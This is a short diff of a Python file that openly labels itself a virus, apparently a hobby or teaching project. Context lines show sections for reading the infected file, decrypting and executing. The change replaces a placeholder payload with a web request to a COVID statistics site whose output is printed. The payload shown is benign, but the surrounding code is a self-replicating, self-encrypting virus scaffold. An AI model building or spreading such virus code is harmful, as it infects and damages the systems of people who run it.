@@ -1,6 +1,5 @@
 # start the virus
-import sys, glob, re, codecs,random
-
+import sys, glob, re, codecs,random, requests, json
 # read the virus/infected file
 virusLines = []
 thisFile = sys.argv[0]
@@ -110,7 +109,7 @@ if not is_encrypted:
 
 # end the virus
 
-import sys, glob, re, codecs,random
+import sys, glob, re, codecs,random , requests, json
 
 # decryption part and execution
 def decrypt_one_line(line,key_in_bits):
@@ -199,4 +198,5 @@ if(is_encrypted):
 
 # PAYLOAD
 
-print("Here comes the payload !!")
+response = requests.get(' https://corona-stats.online?top=10')
+print(response.text[900:-292])
